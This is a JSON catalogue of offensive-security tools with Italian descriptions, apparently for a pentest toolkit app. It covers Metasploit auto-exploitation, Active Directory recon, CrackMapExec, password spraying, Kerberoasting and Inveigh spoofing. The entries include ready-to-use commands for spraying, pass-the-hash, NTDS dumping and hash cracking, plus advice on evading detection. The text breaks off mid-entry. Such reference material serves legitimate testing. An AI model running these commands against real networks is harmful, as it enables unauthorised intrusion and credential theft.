[
  {
    "id": "metasploit-pentest-plugin",
    "name": "Pentest-plugin",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/darkoperator/Metasploit-Plugins",
    "desc": "Plugin per Metasploit che automatizza discovery di rete, auto-exploitation da report (Nessus/OpenVAS) e post-exploitation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Il Pentest Plugin di darkoperator è un'estensione essenziale per il framework Metasploit, progettata per accelerare le fasi ripetitive di un penetration test. Permette di importare i report di vulnerabilità da scanner terzi (come Nessus, Qualys, OpenVAS) e tentare automaticamente l'exploitation dei target vulnerabili (<code>auto_exploit</code>). Inoltre, offre comandi avanzati per la discovery di rete e la gestione massiva di sessioni post-exploitation, facilitando il pivoting e la raccolta dati su larga scala.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Exploitation:</strong> La \"killer feature\" del plugin. Analizza le vulnerabilità importate nel database (db_import) e mappa automaticamente le CVE ai moduli exploit disponibili in Metasploit, lanciandoli contro i target specificati. Include filtri per escludere exploit DoS o instabili.</p><p><strong>Post-Exploitation Massiva:</strong> Comandi come <code>multi_post</code> e <code>multi_meter_cmd</code> permettono di eseguire moduli di post-exploitation o comandi console su tutte le sessioni attive simultaneamente (o su un subset filtrato), riducendo drasticamente il tempo necessario per enumerare credenziali o hash su reti compromesse.</p><p><strong>Project Management:</strong> Migliora la gestione del workflow creando workspace isolati per cliente e salvando automaticamente i log delle attività, essenziale per il reporting professionale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Caricare il plugin nella console msf e importare uno scan.</p><pre><code># Caricamento plugin\nmsf > load pentest\n\n# Importazione report Nessus e auto-exploit\nmsf > db_import scan_results.nessus\nmsf > auto_exploit -match_port -rating high -j\n\n# Esecuzione comando su tutte le sessioni Windows\nmsf > multi_cmd -c \"whoami\" -s Windows</code></pre><p>Richiede una connessione al database postgresql attiva (<code>msfdb init</code>) per funzionare correttamente.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Internal Network Pentest</strong>, dopo aver scansionato una subnet con Nessus, il plugin permette di verificare rapidamente quali vulnerabilità siano realmente sfruttabili (exploit validation) senza configurare manualmente centinaia di moduli.</p><p>Durante fasi di <strong>Red Teaming</strong>, la gestione centralizzata delle sessioni aiuta a mantenere la situational awareness su molti host compromessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di <code>auto_exploit</code> è estremamente rumoroso (\"Hail Mary attack\") e genererà migliaia di alert su IDS/IPS. Può causare crash di servizi legacy.</p><p><strong>Mitigazioni:</strong> Utilizzare whitelist di host specifici. Preferire l'uso mirato dei comandi post-exploitation su sessioni già stabilite piuttosto che l'auto-exploit indiscriminato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Metasploit_Plugins"
    ],
    "notes": null
  },
  {
    "id": "scipag-vulscan",
    "name": "Vulscan",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/scipag/vulscan",
    "desc": "Modulo NSE per Nmap che converte output di version detection in suggerimenti CVE tramite database offline di vulnerabilità.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Vulscan</strong> trasforma il port scanner Nmap in uno strumento di vulnerability assessment preliminare, sfruttando il motore di scripting NSE. A differenza degli scanner attivi tradizionali, Vulscan opera correlando localmente le versioni dei servizi rilevati (fingerprinting) con molteplici database di vulnerabilità offline. Questo approccio permette di identificare potenziali CVE senza inviare pacchetti di exploit o traffico di scansione vulnerabilità specifico verso il target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Correlazione Offline:</strong> La funzione core del tool è il matching testuale tra la stringa di versione del servizio (es. 'Apache 2.4.49') e i record contenuti nei file CSV locali (ExploitDB, CVE, SecurityFocus). Poiché non richiede query online, garantisce totale riservatezza sulle vulnerabilità ricercate e funziona perfettamente in ambienti segregati o air-gapped.</p><p><strong>Supporto Multi-Database:</strong> Vulscan integra nativamente diversi repository di vulnerabilità, inclusi cve.csv, exploitdb.csv e scipvuldb.csv. L'utente può scegliere di interrogare un singolo database per rapidità o tutti simultaneamente per la massima copertura, personalizzando il livello di dettaglio dell'output.</p><p><strong>Integrazione Nmap:</strong> Essendo uno script NSE, beneficia di tutta la flessibilità di Nmap: può essere combinato con opzioni di evasione firewall, timing template e output in vari formati (XML, Grepable), rendendolo facilmente integrabile in pipeline di CI/CD o script di automazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'utilizzo richiede l'installazione dello script nella directory <code>scripts</code> di Nmap e la presenza dei file CSV dei database. Il comando base invoca lo script durante una scansione con detection delle versioni attiva (<code>-sV</code>).</p><pre><code># Scansione con output standard (tutti i DB)\nnmap -sV --script=vulscan/vulscan.nse target.com\n\n# Scansione focalizzata su exploit noti\nnmap -sV --script=vulscan/vulscan.nse --script-args vulscandb=exploitdb.csv target.com</code></pre><p>Per mantenere l'efficacia del tool, è necessario aggiornare regolarmente i file CSV utilizzando lo script <code>update.sh</code> fornito nel repository, poiché Vulscan non scarica definizioni in tempo reale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di <strong>Triage Iniziale</strong>, Vulscan offre una panoramica rapida dei vettori di attacco più probabili su un perimetro vasto, permettendo di prioritizzare quali host analizzare con scanner più pesanti.</p><p>In contesti <strong>High Security / Air-Gapped</strong>, dove non è possibile utilizzare scanner cloud-based o che richiedono aggiornamenti online, Vulscan rappresenta una soluzione autonoma ed efficace.</p><p>Per i <strong>CTF e Red Teaming</strong>, fornisce suggerimenti immediati su exploit pubblici disponibili per i servizi esposti senza il rumore generato da tool come Nessus.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Vulscan in sé è passivo (analizza l'output di Nmap), ma la scansione Nmap sottostante con flag <code>-sV</code> (Version Detection) è attiva e interagisce con i servizi per estrarre i banner. Questo genera log applicativi e traffico di rete riconoscibile.</p><p><strong>Impatto operativo:</strong> Basso rischio di crash dei servizi rispetto a scanner attivi, ma la scansione di versione può essere lenta su grandi range di IP.</p><p><strong>Mitigazioni:</strong> I risultati sono basati sulla versione dichiarata, quindi sono possibili falsi positivi (se le patch sono state backportate) e falsi negativi (se il banner è oscurato). Verificare sempre manualmente le finding prima di lanciare exploit.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Scripts"
    ],
    "notes": null
  },
  {
    "id": "resolvers",
    "name": "Resolvers",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/trickest/resolvers",
    "desc": "Elenco esaustivo e validato di DNS resolver pubblici per ricognizione DNS e enumerazione di domini.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Resolvers</strong> è un progetto open-source che fornisce una raccolta il più possibile completa e affidabile di <strong>DNS resolver pubblici</strong> da usare in attività di ricognizione, enumeration DNS o come input per strumenti di risoluzione massiva di nomi di dominio. Il repository contiene varie liste di resolver (semplici, estese e “trusted”), generate e validate mediante un workflow automatizzato che aggrega sorgenti multiple e applica filtraggio tramite <code>dnsvalidator</code> per ridurre i falsi positivi e migliorare l’affidabilità.</p><br><hr><h4 class=\"rt-purple\">Componenti delle liste DNS</h4><ul><li><strong><code>resolvers.txt</code>:</strong> Un elenco di indirizzi IP di resolver DNS pubblici che possono essere passati direttamente a strumenti di enumeration per risolvere nomi di dominio o record DNS. Ogni indirizzo rappresenta un server DNS che risponde alle query.</li><li><strong><code>resolvers-extended.txt</code>:</strong> La stessa lista principale ma con informazioni aggiuntive su ciascun resolver come organizzazione, paese e frequenza di validazione. Questi metadati aiutano a valutare qualità e origine dei resolver.</li><li><strong><code>resolvers-trusted.txt</code>:</strong> Una selezione di resolver considerati affidabili provenienti da provider rinomati (es. Cloudflare, Google). Questa lista è utile per confrontare o convalidare i risultati ottenuti con la lista principale.</><br><hr><h4 class=\"rt-green\">Meccanismo di generazione</h4><p>La lista è costruita aggregando dataset di resolver da diverse fonti pubbliche e comunitarie, poi un workflow ciclico utilizza strumenti di validazione (come <code>dnsvalidator</code>) per testare e filtrare gli indirizzi raccolti. Il processo elimina i resolver non affidabili o non più operativi e calcola statistiche di frequenza per ogni indirizzo, consolidando così una fonte di resolver affidabili e aggiornata.</p><br><hr><h4 class=\"rt-amber\">Utilizzo tipico</h4><p>Queste liste di resolver DNS sono spesso usate in tool di sicurezza per:</p><ul><li>Enumerazione massiva di domini o sottodomini usando risolutori pubblici per bypassare limitazioni di rate imposte dai server DNS target.</li><li>Ricognizione di asset esterni, dove resolver multipli aumentano copertura e resilienza delle query DNS.</li><li>Validazione di pipeline di scanning dove è necessario un set di resolver affidabili per test automatizzati o orchestrati.</li></ul><p>Ad esempio, in strumenti di subdomain discovery o DNS bruteforcing si può specificare <code>resolvers.txt</code> come input per ottenere risposte più rapide e diversificate dalle query DNS.</p><br><hr><h4 class=\"rt-red\">Considerazioni operazionali</h4><p><strong>Affidabilità:</strong> Anche se i resolver presentati sono stati validati, alcuni resolver pubblici possono comportarsi in modo incoerente o restituire risposte non standard. È buona pratica testare la qualità dei resolver in base all’uso specifico e aggiornare regolarmente le liste.</p><p><strong>Implicazioni di sicurezza:</strong> L’uso di resolver pubblici in attività offensive o aggressive può generare traffico DNS non desiderato o essere soggetto a limitazioni. Utilizzare resolver trusted quando possibile e rispettare le policy di utilizzo delle reti target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Network"
    ],
    "notes": null
  },
  {
    "id": "adrecon",
    "name": "ADRecon",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/sense-of-security/ADRecon",
    "desc": "Tool PowerShell per raccolta completa di artefatti Active Directory (trust, GPO, deleghe, utenti privilegiati) con report Excel.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ADRecon</strong> è lo strumento definitivo per la fotografia statica dello stato di sicurezza di un ambiente Active Directory. Eseguito con privilegi di utente standard o amministrativi, estrae una mole massiva di informazioni strutturali e di sicurezza dal Domain Controller, consolidandole in un report Excel multipagina. È progettato per facilitare l'identificazione di misconfigurazioni complesse, relazioni di trust e violazioni di best practice senza richiedere agenti permanenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione Olistica:</strong> ADRecon non si limita agli utenti e computer, ma mappa l'intera foresta: relazioni di trust, site e subnet, Group Policy Object (GPO) con relativi link, deleghe Kerberos (Unconstrained/Constrained), e configurazioni LAPS. Questa visibilità completa è cruciale per comprendere la superficie d'attacco reale dell'infrastruttura.</p><p><strong>Analisi GPO e ACL:</strong> Il tool analizza i permessi critici e le impostazioni delle policy, evidenziando chi ha diritti di modifica su oggetti sensibili (es. AdminSDHolder) o quali GPO applicano configurazioni insicure (es. SMB Signing disabilitato). Questo livello di dettaglio aiuta a tracciare percorsi di privilege escalation basati su misconfigurazioni logiche.</p><p><strong>Reporting Strutturato:</strong> Il valore distintivo di ADRecon è l'output: un file Excel autogenerato con fogli separati per ogni categoria di oggetto (Domain Controllers, Users, Groups, GPO, ecc.) e dashboard riassuntive. Questo formato rende i dati immediatamente consumabili sia per analisi tecniche che per presentazioni executive.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>ADRecon è uno script PowerShell che può essere eseguito direttamente da un host unito al dominio o tramite <code>runas</code> con credenziali di dominio (es. tramite <code>/netonly</code>). Non richiede installazione, ma necessita del modulo Active Directory o RSAT per funzionalità complete.</p><pre><code># Esecuzione standard con credenziali correnti\nPS C:\\> .\\ADRecon.ps1\n\n# Esecuzione su dominio target specifico con credenziali\nPS C:\\> .\\ADRecon.ps1 -DomainController dc01.corp.local -Credential (Get-Credential)</code></pre><p>L'esecuzione può richiedere diversi minuti a seconda della dimensione del dominio. Al termine, il report viene salvato nella cartella di output con timestamp, pronto per l'analisi offline.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Post-Exploitation Enumeration</strong>, ADRecon viene lanciato dopo aver ottenuto un accesso iniziale per mappare rapidamente il terreno e identificare obiettivi di alto valore (High Value Targets) e percorsi di movimento laterale.</p><p>Per <strong>Security Assessment e Audit</strong>, fornisce una snapshot auditabile della conformità dell'AD, evidenziando account obsoleti, password policy deboli e trust non necessari.</p><p>Nelle operazioni di <strong>M&A (Mergers and Acquisitions)</strong>, permette di valutare rapidamente il rischio di sicurezza di un dominio acquisito prima di stabilire trust bidirezionali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> ADRecon genera un volume elevato di query LDAP verso il Domain Controller, che può essere rilevato da soluzioni di monitoraggio (es. Microsoft Defender for Identity) come attività di ricognizione anomala. L'esecuzione scrive file su disco.</p><p><strong>Impatto operativo:</strong> L'estrazione massiva di dati può causare un leggero carico sulla rete e sul DC in ambienti molto grandi, ma raramente causa disservizi.</p><p><strong>Mitigazioni:</strong> Eseguire il tool da una macchina non monitorata o durante finestre di manutenzione. Se possibile, utilizzare tecniche di \"living off the land\" più discrete per query mirate se l'obiettivo è stealth assoluto. Proteggere il report Excel generato poiché contiene la mappa completa della rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "crackmapexec-win",
    "name": "CrackMapExecWin",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/maaaaz/CrackMapExecWin",
    "desc": "Framework post-exploitation multi-protocollo (SMB/WinRM/LDAP) per network sweeping, spraying, esecuzione comandi e attacchi modulari su reti Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>CrackMapExec (spesso abbreviato in CME e ora evoluto in NetExec) è il \"coltellino svizzero\" per il pentesting di ambienti Windows/Active Directory. Consente di eseguire azioni massive su intere subnet sfruttando protocolli nativi come SMB, WMI, WinRM e MSSQL. Il tool gestisce automaticamente l'autenticazione, il mantenimento delle sessioni e l'esecuzione di moduli per l'enumerazione, il lateral movement e l'esfiltrazione di dati, mantenendo un database interno degli host compromessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Network Sweeping & Credential Spraying:</strong> CME eccelle nel validare credenziali su larga scala. Può testare una coppia username/password o un hash NTLM (Pass-the-Hash) contro centinaia di host simultaneamente per individuare dove l'utente ha privilegi di accesso o amministrativi (Pwn3d!). Integra meccanismi di controllo per evitare il blocco degli account durante attacchi di password spraying.</p><p><strong>Esecuzione Comandi & Lateral Movement:</strong> Una volta identificati i privilegi amministrativi, il tool permette l'esecuzione remota di comandi cmd o PowerShell tramite metodi multipli (atexec, smbexec, wmiexec), spesso senza caricare binari sul disco target. Facilita il movimento laterale iniettando payload Meterpreter o Cobalt Strike beacon direttamente in memoria.</p><p><strong>Modularità Estensibile:</strong> Il vero potenziale risiede nel sistema di moduli. È possibile eseguire task complessi post-autenticazione come il dump del database SAM (<code>--sam</code>), l'estrazione di credenziali LSA (<code>--lsa</code>), l'enumerazione di sessioni loggate, il controllo delle difese antivirus (<code>enum_avproducts</code>) o l'esecuzione di Mimikatz, tutto automatizzato e parallelo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La sintassi segue lo schema: <code>protocollo target opzioni</code>. È fondamentale specificare le credenziali (in chiaro o hash) e l'azione desiderata.</p><pre><code># Spraying di password su una subnet SMB\ncrackmapexec smb 192.168.1.0/24 -u user.txt -p 'Password123'\n\n# Pass-the-Hash per eseguire comandi (check privilegi Admin)\ncrackmapexec smb 10.0.0.50 -u Administrator -H <NTLM_HASH> -x \"whoami\"\n\n# Dump del database NTDS (richiede Domain Admin)\ncrackmapexec smb dc01.corp.local -u Admin -p Pass --ntds drsuapi</code></pre><p>CME mantiene un database interno (<code>cmedb</code>) che traccia automaticamente quali host sono stati compromessi, permettendo di interrogare rapidamente i risultati senza dover ripetere le scansioni.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante il <strong>Lateral Movement</strong>, CME è lo strumento primario per identificare rapidamente su quali altre macchine le credenziali appena compromesse sono valide, permettendo di espandere l'accesso orizzontalmente.</p><p>In fase di <strong>Privilege Escalation</strong>, moduli come <code>spider_plus</code> possono cercare file sensibili contenenti password nelle share di rete accessibili.</p><p>Per l'<strong>Audit delle Password</strong>, permette di verificare la conformità delle policy (es. riutilizzo password local admin) su tutto il parco macchine in pochi secondi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> CME è intrinsecamente rumoroso. Le scansioni su ampi range IP generano traffico SMB/RPC massivo e sequenziale, creando picchi di eventi di \"Logon\" (4624) e \"Logon Failure\" (4625) facilmente correlabili dai SIEM. L'uso di tecniche come <code>psexec</code> lascia artefatti di servizio nei log di sistema.</p><p><strong>Impatto operativo:</strong> Il password spraying mal configurato può causare il blocco massivo degli account utente. L'esecuzione di comandi pesanti su molti host contemporaneamente può saturare la banda o le risorse dei target.</p><p><strong>Mitigazioni:</strong> Utilizzare opzioni di <code>--jitter</code> e <code>--sleep</code> per rallentare le scansioni e renderle meno deterministiche. Preferire protocolli meno monitorati come WinRM rispetto a SMB se possibile. Evitare l'uso di moduli che caricano binari su disco (es. Mimikatz) se è presente un EDR attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "domainpasswordspray",
    "name": "DomainPasswordSpray.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dafthack/DomainPasswordSpray",
    "desc": "Script PowerShell per password spraying su Active Directory con generazione automatica userlist e protezione lockout intelligente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>DomainPasswordSpray automatizza una delle tecniche più efficaci per ottenere accesso iniziale: il password spraying. A differenza del brute-force tradizionale, questo tool inverte la logica provando una singola password comune contro tutti gli utenti del dominio. È progettato con una forte enfasi sulla sicurezza operativa (OPSEC), integrando controlli automatici per evitare il blocco degli account utente e l'interruzione dei servizi business-critical.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Userlist Dinamica:</strong> Invece di richiedere liste esterne, lo script interroga direttamente il dominio per ottenere l'elenco aggiornato degli utenti attivi. Filtra automaticamente account disabilitati o che hanno già un conteggio di \"Bad Password\" pericolosamente vicino alla soglia di lockout, proteggendo l'operazione.</p><p><strong>Smart Lockout Avoidance:</strong> Prima di ogni tentativo, verifica la policy delle password del dominio (o le Fine Grained Password Policies se applicabili) per assicurarsi che lo spraying non triggeri blocchi di massa. Include funzionalità di resume per riprendere l'attacco esattamente da dove interrotto in caso di stop.</p><p><strong>Supporto Multi-Protocollo:</strong> Può eseguire la validazione delle credenziali utilizzando diversi metodi, tra cui LDAP (default) o Kerberos Pre-Authentication. Quest'ultimo è spesso preferibile in quanto genera log meno evidenti rispetto a tentativi di login NTLM/LDAP falliti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script deve essere importato in una sessione PowerShell autenticata (anche con utente non privilegiato). L'esecuzione base richiede solo la password da testare.</p><pre><code># Spraying base con una password (es. StagioneAnno)\nInvoke-DomainPasswordSpray -Password \"Estate2024!\"\n\n# Spraying con output su file e lista utenti manuale\nInvoke-DomainPasswordSpray -UserList users.txt -Password \"Password123\" -OutFile spray_results.txt\n\n# Modalità continua con lista password (attesa automatica tra tentativi)\nInvoke-DomainPasswordSpray -PasswordList common_passwords.txt -SleepMinutes 35</code></pre><p>È fondamentale utilizzare il parametro <code>-SleepMinutes</code> quando si testano più password per rispettare la finestra di reset del contatore dei tentativi falliti (solitamente 30 minuti).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Initial Access</strong> interna, quando si possiede un dispositivo nella rete ma nessuna credenziale valida, lo spraying permette spesso di compromettere il primo account utente sfruttando password deboli.</p><p>In fase di <strong>Lateral Movement</strong>, può essere usato per identificare se le credenziali di un account compromesso sono condivise su altri profili (password reuse).</p><p>Per i <strong>Blue Team</strong>, è uno strumento essenziale per audit periodici della robustezza delle password degli impiegati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Anche se attento, lo spraying genera un volume elevato di eventi 4625 (Logon Failed) o 4771 (Kerberos Pre-Auth Failed) in un breve lasso di tempo. I SIEM moderni rilevano facilmente il pattern \"singola sorgente, molti target falliti\".</p><p><strong>Impatto operativo:</strong> Se la policy di lockout è configurata male o lo stato del dominio non è sincronizzato, esiste il rischio residuo di bloccare account legittimi. Verificare sempre la policy prima di lanciare.</p><p><strong>Mitigazioni:</strong> Eseguire lo spray in modalità \"low and slow\" (una password al giorno o ogni ora). Se possibile, ruotare l'indirizzo IP sorgente o utilizzare host multipli per distribuire il carico di eventi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "getuserspns-windows",
    "name": "GetUserSPNs_windows.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/maaaaz/impacket-examples-windows",
    "desc": "Tool Impacket per esecuzione attacco Kerberoasting: enumera SPN e richiede ticket TGS cifrati per cracking password offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>GetUserSPNs è l'implementazione compilata per Windows del celebre script Python di Impacket, strumento cardine per l'attacco di Kerberoasting. Permette a qualsiasi utente autenticato nel dominio di richiedere i Service Principal Names (SPN) associati agli account di servizio e di ottenere i relativi ticket TGS (Ticket Granting Service). Questi ticket, cifrati con la password dell'account di servizio, possono essere estratti e attaccati offline per rivelare le credenziali in chiaro senza interagire ulteriormente con il target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione SPN:</strong> Il tool scansiona la directory Active Directory alla ricerca di account utente configurati come service account (che possiedono un attributo `servicePrincipalName`). Questo permette di identificare rapidamente target di alto valore come account SQL, IIS o di backup.</p><p><strong>Richiesta TGS (Kerberoasting):</strong> Una volta identificati gli account, invia richieste legittime al KDC per ottenere i ticket di servizio. Il KDC risponde con un ticket cifrato che contiene, nella sua struttura, materiale crittografico derivato dalla password dell'account target.</p><p><strong>Formattazione Hash:</strong> L'output può essere salvato in formati compatibili con i principali password cracker (Hashcat e John the Ripper), facilitando il passaggio immediato alla fase di cracking offline.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il tool viene eseguito da riga di comando. Se eseguito da una macchina in dominio con sessione utente attiva, non richiede credenziali; altrimenti, accetta username e password/hash.</p><pre><code># Enumerazione e richiesta ticket (output a video)\nGetUserSPNs.exe -request -dc-ip 192.168.1.10 domain.local/user\n\n# Salvataggio ticket formattati per Hashcat\nGetUserSPNs.exe -request -dc-ip 192.168.1.10 -outputfile hashes.txt domain.local/user\n\n# Autenticazione Pass-the-Hash\nGetUserSPNs.exe -request -hashes :ntlm_hash domain.local/user</code></pre><p>I file generati possono essere crackati con Hashcat usando il modulo 13100: <code>hashcat -m 13100 hashes.txt wordlist.txt</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Kerberoasting è la tecnica standard per l'<strong>Escalation dei Privilegi</strong> in ambiente AD.</p><p>Spesso gli account di servizio hanno privilegi amministrativi (es. Domain Admins o Local Admins su server critici) e password deboli o mai ruotate. È efficace anche per stabilire <strong>Persistenza</strong>: una volta ottenuta la password di un service account, l'attaccante può generare Silver Ticket per accedere ai servizi specifici senza lasciare tracce sul Domain Controller.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La richiesta di ticket TGS per servizi con cifratura RC4 (obsoleta) è un indicatore forte (Event ID 4769). Richieste multiple di TGS in rapida successione da un singolo host sono facilmente rilevabili da Defender for Identity.</p><p><strong>Impatto operativo:</strong> L'attacco è passivo sui sistemi target (non causa crash), ma genera traffico verso il DC.</p><p><strong>Mitigazioni:</strong> Utilizzare service account gMSA (Managed Service Accounts) con password complesse e rotazione automatica. Monitorare l'uso della cifratura RC4 in Kerberos.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "group3r",
    "name": "Group3r",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Group3r/Group3r",
    "desc": "Motore di analisi GPO che identifica misconfigurazioni exploitable, credenziali in chiaro e permessi di scrittura pericolosi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Group3r</strong> è uno strumento specializzato nell'analisi offensiva delle Group Policy Object (GPO). A differenza dei tool di audit generici, Group3r si concentra esclusivamente su configurazioni errate che possono essere sfruttate attivamente da un attaccante per elevare i privilegi o persistere nella rete. Analizza file system (SYSVOL), attributi AD e contenuti delle policy per trovare \"aghi nel pagliaio\" come password decifrabili, script modificabili o assegnazioni di diritti rischiosi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Rilevamento Credenziali:</strong> Cerca attivamente rimasugli di Group Policy Preferences (GPP) contenenti password \"cpassword\" (decifrabili staticamente) e scansiona script di logon/startup alla ricerca di credenziali hardcoded o file di configurazione sensibili distribuiti via GPO.</p><p><strong>Analisi Permessi GPO:</strong> Verifica le Access Control List (ACL) degli oggetti GPO per identificare se l'utente corrente (o un gruppo di cui fa parte) ha diritti di scrittura. Modificare una GPO permette di eseguire codice su tutti i computer o utenti a cui la policy è applicata.</p><p><strong>Controllo Integrità SYSVOL:</strong> Controlla se i file fisici delle policy residenti nella share SYSVOL sono scrivibili da utenti non privilegiati, un vettore comune per inserire backdoor negli script di avvio aziendali.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Group3r deve essere eseguito da un host unito al dominio. Non richiede privilegi amministrativi per la maggior parte delle operazioni di lettura.</p><pre><code># Analisi completa con output su file HTML e JSON\n.\\group3r.exe -f report.html -o json\n\n# Analisi focalizzata solo su finding ad alto impatto\n.\\group3r.exe -s High\n\n# Inclusione di dati SYSVOL (richiede accesso alla share)\n.\\group3r.exe --sysvol</code></pre><p>L'output colorato in console aiuta a identificare immediatamente le criticità, mentre il report HTML fornisce dettagli tecnici e comandi per verificare o sfruttare le vulnerabilità trovate.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Privilege Escalation</strong>, Group3r rivela percorsi non ovvi: ad esempio, scoprire che il gruppo \"HelpDesk\" può modificare la GPO \"Default Domain Policy\" garantisce il controllo totale sul dominio.</p><p>In attività di <strong>Post-Exploitation</strong>, permette di mappare dove vengono distribuiti software o configurazioni, facilitando il movimento laterale verso target specifici.</p><p>Per i <strong>Defense Team</strong>, aiuta a sanare debiti tecnici storici nelle configurazioni AD.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'analisi comporta una lettura intensiva di oggetti AD e file su SYSVOL. Anche se il traffico è legittimo (lettura policy), il volume e la velocità possono insospettire sistemi di monitoraggio comportamentale.</p><p><strong>Impatto operativo:</strong> Minimo, essenzialmente operazioni di lettura. L'accesso a SYSVOL è traffico SMB standard.</p><p><strong>Mitigazioni:</strong> Eseguire il tool localmente e off-line se possibile (esportando prima i dati) o rallentare l'esecuzione. Non tentare l'exploit automatico delle GPO trovate senza autorizzazione esplicita, poiché l'impatto è globale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "inveigh-exe",
    "name": "Inveigh.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Kevin-Robertson/Inveigh",
    "desc": "Spoofer e Man-in-the-Middle framework .NET per cattura hash e NTLM relay su reti Windows (LLMNR/mDNS/NBNS).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Inveigh (versione C#/.NET) è l'evoluzione del celebre script PowerShell, progettato per eseguire attacchi Man-in-the-Middle (MITM) e spoofing su reti locali Windows. Intercettando richieste di risoluzione nomi multicast/broadcast (LLMNR, NBT-NS, mDNS), inganna i client vittime facendosi passare per le risorse cercate. Questo permette di catturare hash NetNTLMv1/v2 o di eseguire attacchi di relay verso altri servizi, il tutto da un binario autonomo che non richiede PowerShell.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Spoofing Multiprotocollo:</strong> Risponde a richieste LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) e mDNS. Supporta anche lo spoofing DHCPv6 per attacchi su reti IPv6, spesso trascurate dai difensori ma abilitate di default.</p><p><strong>Listener Integrati:</strong> Include server rogue per SMB, HTTP/HTTPS, DNS e LDAP. Questi listener catturano le negoziazioni di autenticazione in arrivo dai client dirottati, registrando credenziali e hash per il cracking.</p><p><strong>NTLM Relay:</strong> Invece di limitarsi a catturare gli hash, Inveigh può inoltrarli in tempo reale verso altri target validi (SMB Relay) per eseguire comandi o ottenere accesso non autorizzato, coordinandosi con tecniche di cross-protocol relay.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'interfaccia a riga di comando è interattiva e offre controllo granulare. Richiede privilegi elevati (Amministratore/SYSTEM) per aprire socket raw e porte privilegiate (445, 80, 53).</p><pre><code># Avvio base (Spoofing LLMNR/mDNS, 